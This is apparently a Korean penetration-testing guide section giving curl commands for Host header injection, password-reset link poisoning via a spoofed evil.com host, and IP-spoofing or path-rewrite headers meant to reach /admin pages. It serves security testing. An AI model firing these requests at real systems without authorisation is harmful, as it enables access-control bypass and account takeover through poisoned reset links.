### Phase 2: 동적 테스트 (검증)


**Host Header Injection 테스트:**
```
# Host 헤더 변조 — 응답에 변조된 Host가 반영되는지 확인
curl "https://target.com/" -H "Host: evil.com" -v

# X-Forwarded-Host 변조
curl "https://target.com/" -H "X-Forwarded-Host: evil.com" -v

# 패스워드 리셋 — Host 변조 후 이메일에 변조된 URL이 포함되는지
curl -X POST "https://target.com/api/password-reset" \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'

# 가상 호스트 접근 — 다른 호스트명으로 내부 페이지 접근 시도
curl "https://target.com/admin" -H "Host: internal.target.com" -v
curl "https://target.com/admin" -H "Host: localhost" -v
```

**IP Spoofing 테스트:**
```
# X-Forwarded-For 변조 — 내부 IP로 위장
curl "https://target.com/admin" -H "X-Forwarded-For: 127.0.0.1" -v
curl "https://target.com/admin" -H "X-Forwarded-For: 10.0.0.1" -v
curl "https://target.com/admin" -H "X-Forwarded-For: 192.168.0.1" -v

# X-Real-IP 변조
curl "https://target.com/admin" -H "X-Real-IP: 127.0.0.1" -v

# X-CLUSTER-CLIENT-IP 변조
curl "https://target.com/admin" -H "X-CLUSTER-CLIENT-IP: 127.0.0.1" -v

# X-Client-IP 변조
curl "https://target.com/admin" -H "X-Client-IP: 127.0.0.1" -v

# True-Client-IP 변조 (Akamai)
curl "https://target.com/admin" -H "True-Client-IP: 127.0.0.1" -v

# CF-Connecting-IP 변조 (Cloudflare)
curl "https://target.com/admin" -H "CF-Connecting-IP: 127.0.0.1" -v

# X-Original-URL / X-Rewrite-URL — 경로 우회
curl "https://target.com/" -H "X-Original-URL: /admin" -v
curl "https://target.com/" -H "X-Rewrite-URL: /admin" -v

# 복합 헤더 변조
curl "https://target.com/admin" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" -v
```

**검증 기준:**
- **확인됨**: 동적 테스트로 헤더 변조를 통해 보안이 우회된 것을 직접 확인함 (내부 자산 접근, 응답에 변조된 Host 반영, IP 접근제어 우회 등)
